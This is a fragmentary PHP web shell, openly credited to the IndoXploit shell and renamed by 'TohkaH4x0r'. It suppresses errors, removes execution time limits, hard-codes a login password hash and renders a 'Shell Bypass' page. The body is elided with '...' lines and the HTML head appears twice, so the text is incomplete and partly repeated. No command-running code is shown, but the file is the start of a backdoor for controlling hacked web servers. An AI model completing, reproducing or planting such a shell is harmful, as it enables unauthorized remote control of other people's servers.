<?php
/*
	* Orginal Source by IndoXploit
	* Renamed by TohkaH4x0r
	* Jangan Di Bypass Dong Shell Nya :)
*/
session_start();
@error_reporting(0);
@set_time_limit(0);
...
$password = "4ffe11d722d36697c617574f0a424bd6";
...
<html>
<head>
<title>TohkaH4x0r | Shell Bypass</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
...
<head>
<title>TohkaH4x0r | Shell Bypass</title>
<meta name='author' content='TohkaH4x0r | Shell Bypass'>
<meta charset="UTF-8">
<style type='text/css'>
